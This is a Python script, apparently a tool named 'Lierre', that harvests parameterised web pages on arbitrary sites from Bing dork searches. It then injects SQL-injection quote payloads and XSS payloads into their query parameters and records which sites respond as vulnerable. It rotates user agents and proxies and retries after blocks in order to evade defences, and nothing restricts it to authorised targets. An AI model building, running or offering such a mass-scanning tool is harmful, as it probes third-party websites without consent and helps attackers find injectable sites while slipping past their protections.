import requests
from bs4 import BeautifulSoup
import time
import random
import os
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import init, Fore, Style

# Initialize colorama for Termux and PC
init()

print("""
______________________________
\nLierre - Advanced Dork Scanner\nMIT License\nSee LICENSE for details.
______________________________
""")

# Log error function
def log_error(message):
    with open(error_log_file, "a", encoding="utf-8") as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")  # Fixed time format

# Extended blacklist
blacklist_domains = [
    "microsoft.com", "google.com", "facebook.com", "twitter.com", "amazon.com",
    "apple.com", "linkedin.com", "youtube.com", "wikipedia.org", "wordpress.com",
    "blogspot.com", "github.com", "stackoverflow.com", "reddit.com", "instagram.com",
    "tiktok.com", "shopify.com", "wix.com", "squarespace.com", "paypal.com",
    "ebay.com", "netflix.com", "spotify.com", "bbc.com", "cnn.com", "nytimes.com",
    "forbes.com", "medium.com", "tumblr.com", "theguardian.com", "quora.com",
    "huffpost.com", "buzzfeed.com", "yelp.com", "tripadvisor.com", "zillow.com",
    "aliexpress.com", "etsy.com", "pinterest.com", "vimeo.com", "twitch.tv",
    "discord.com", "fabrikar.com", "vbulletin.com", "phpbb.com", "discourse.org",
    "xenforo.com"
]

# Blacklist patterns for URLs
blacklist_patterns = [
    "com_expose", "com_foxcontact", "/forums/", "/threads/", "/board/", "/topic/",
    "/login/", "/signup/", "/wp-admin/", "/admin/"
]

# Extended User-Agent list
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 9; SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
]

# SQL injection payloads
sql_payloads = ["'", '"']
sql_error_patterns = [
    "you have an error in your sql syntax", "unterminated quoted string",
    "sql syntax error", "database error", "sql exception"
]
xss_payloads = [
    "<script>alert('XSS')</script>", "'><script>alert(1)</script>",
    "<img src=x onerror=alert('XSS')>", "javascript:alert('XSS')"
]

# User input
use_proxy = input(f"{Fore.CYAN}Use proxy? (yes/no): {Style.RESET_ALL}").lower() == 'yes'
scan_type = input(f"{Fore.CYAN}Select scan type (sql/xss): {Style.RESET_ALL}").lower()
output_file = "results.txt"
error_log_file = "errors.log"
max_results = 100
max_pages = 10
max_retries = 3

# Load dorks from dorks.txt
dorks = []
try:
    with open("dorks.txt", "r") as f:
        dorks = [line.strip() for line in f if line.strip()]
    print(f"{Fore.GREEN}[*] Loaded {len(dorks)} dorks from dorks.txt.\033[0m")
except FileNotFoundError:
    print(f"{Fore.RED}[!] dorks.txt not found. Exiting.\033[0m")
    exit(1)

# Load proxies from proxies.txt
proxies_list = []
if use_proxy:
    try:
        with open("proxies.txt", "r") as f:
            proxies_list = [line.strip() for line in f if line.strip()]
        print(f"{Fore.GREEN}[*] Loaded {len(proxies_list)} proxies from proxies.txt.\033[0m")
    except FileNotFoundError:
        print(f"{Fore.RED}[!] No proxies found in proxies.txt. Proxy disabled.\033[0m")
        use_proxy = False

def normalize_url(url):
    parsed = urlparse(url)
    scheme = parsed.scheme.lower()
    netloc = parsed.netloc.lower()
    path = parsed.path.rstrip('/')
    query_params = parse_qs(parsed.query)
    sorted_query = urlencode(query_params, doseq=True)
    normalized = urlunparse((scheme, netloc, path, parsed.params, sorted_query, ''))
    return normalized

def get_random_user_agent():
    return random.choice(user_agents)

def get_random_proxy():
    if proxies_list:
        return {"http": random.choice(proxies_list), "https": random.choice(proxies_list)}
    return None

def is_blacklisted(url):
    parsed = urlparse(url)
    domain = parsed.netloc.lower()
    url_lower = url.lower()
    return (any(blacklisted in domain for blacklisted in blacklist_domains) or
            any(pattern in url_lower for pattern in blacklist_patterns))

def make_request(url, headers, proxies, retries=max_retries):
    for attempt in range(retries):
        try:
            response = requests.get(url, headers=headers, proxies=proxies, timeout=5)
            if response.status_code in [403, 406]:
                log_error(f"{response.status_code} Error: {url}")
                headers["User-Agent"] = get_random_user_agent()
                proxies = get_random_proxy() if use_proxy else None
                time.sleep(random.uniform(2, 5))
                continue
            elif response.status_code == 429:
                log_error(f"429 Too Many Requests: {url}")
                time.sleep(random.uniform(5, 10))
                continue
            elif response.status_code == 502:
                log_error(f"502 Bad Gateway: {url}")
                time.sleep(random.uniform(2, 5))
                continue
            return response
        except Exception as e:
            log_error(f"Error: {url} - {str(e)}")
            time.sleep(random.uniform(2, 5))
    return None

def dork_scan(query, max_results):
    results = set()
    headers = {
        "User-Agent": get_random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.5"
    }
    proxies = get_random_proxy() if use_proxy else None

    if not query.startswith("inurl:"):
        query = f"inurl:{query}"

    print(f"{Fore.BLUE}[*] Scanning dork: {query}\033[0m")
    try:
        for page in range(1, max_pages + 1):  # Fixed syntax error
            bing_url = f"https://www.bing.com/search?q={query.replace(' ', '+')}&first={(page-1)*10+1}"
            response = make_request(bing_url, headers, proxies)
            if response and response.status_code == 200:
                soup = BeautifulSoup(response.text, "html.parser")
                for link in soup.find_all("a", href=True):
                    href = link["href"]
                    if href.startswith("http") and "bing.com" not in href and not is_blacklisted(href):
                        normalized_href = normalize_url(href)
                        parsed = urlparse(normalized_href)
                        if parsed.query and any(ext in parsed.path.lower() for ext in [".php", ".asp", ".aspx", ".jsp"]):
                            if normalized_href not in results:
                                link_response = make_request(normalized_href, headers, proxies)
                                if link_response and link_response.status_code in [200, 500]:
                                    results.add(normalized_href)
                                    print(f"{Fore.GREEN}[+] {normalized_href}\033[0m")
                                if len(results) >= max_results:
                                    break
                time.sleep(random.uniform(2, 3))
            else:
                log_error(f"Bing failed for page {page}: {response.status_code if response else 'No response'}")
                break
    except Exception as e:
        log_error(f"Bing error: {str(e)}")
        print(f"{Fore.RED}[!] Bing error: {e}. Skipping dork.\033[0m")

    return list(results)

def test_sql_injection(url):
    headers = {"User-Agent": get_random_user_agent()}
    proxies = get_random_proxy() if use_proxy else None
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    if not query_params:
        return False, None

    vulnerable_payloads = []
    for param in query_params:
        for payload in sql_payloads:
            new_query = query_params.copy()
            new_query[param] = [payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_query, doseq=True)}"
            response = make_request(test_url, headers, proxies)
            if response and response.status_code == 200:
                response_text = response.text.lower()
                if any(pattern in response_text for pattern in sql_error_patterns):
                    vulnerable_payloads.append(payload)
            time.sleep(random.uniform(0.5, 2))
        if vulnerable_payloads:
            break

    return bool(vulnerable_payloads), vulnerable_payloads

def test_xss(url):
    headers = {"User-Agent": get_random_user_agent()}
    proxies = get_random_proxy() if use_proxy else None
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    if not query_params:
        return False, None

    vulnerable_payloads = []
    for param in query_params:
        for payload in xss_payloads:
            new_query = query_params.copy()
            new_query[param] = [payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_query, doseq=True)}"
            response = make_request(test_url, headers, proxies)
            if response and response.status_code == 200 and payload in response.text:
                vulnerable_payloads.append(payload)
            time.sleep(random.uniform(0.5, 2))
        if vulnerable_payloads:
            break

    return bool(vulnerable_payloads), vulnerable_payloads

def filter_urls(results):
    filtered = []
    for url in results:
        parsed = urlparse(url)
        if parsed.query and any(ext in parsed.path.lower() for ext in [".php", ".asp", ".aspx", ".jsp"]):
            filtered.append(url)
    return filtered

def save_results(dork, results, vulnerable_urls, filename, scan_type):
    with open(filename, "a", encoding="utf-8") as f:
        f.write(f"\nDork: {dork}\nURLs: {len(results)}\n")
        for url in results:
            f.write(f"{url}\n")
        if vulnerable_urls:
            f.write(f"Vulnerable ({scan_type.upper()}):\n")
            for url, payloads in vulnerable_urls:
                f.write(f"{url} [{', '.join(payloads)}]\n")
    print(f"{Fore.GREEN}[*] Results for '{dork}' saved to '{filename}'. Vulnerable URLs: {len(vulnerable_urls)}\033[0m")

def main():
    global scan_type
    if scan_type not in ["sql", "xss"]:
        print(f"{Fore.RED}[!] Invalid scan type. Choose sql or xss.\033[0m")
        exit(1)

    for dork in dorks:
        results = dork_scan(dork, max_results)
        if not results:
            print(f"{Fore.YELLOW}[!] No results for dork: {dork}\033[0m")
            continue

        filtered_results = filter_urls(results)
        print(f"{Fore.BLUE}[*] {len(filtered_results)} URLs filtered for {dork}.\033[0m")

        vulnerable_urls = []
        if scan_type == "sql":
            for url in filtered_results:
                is_vulnerable, payloads = test_sql_injection(url)
                if is_vulnerable:
                    print(f"{Fore.RED}[!] SQL vuln: {url} [{', '.join(payloads)}]\033[0m")
                    vulnerable_urls.append((url, payloads))
        elif scan_type == "xss":
            for url in filtered_results:
                is_vulnerable, payloads = test_xss(url)
                if is_vulnerable:
                    print(f"{Fore.RED}[!] XSS vuln: {url} [{', '.join(payloads)}]\033[0m")
                    vulnerable_urls.append((url, payloads))

        save_results(dork, filtered_results, vulnerable_urls, output_file, scan_type)

if __name__ == "__main__":
    main()
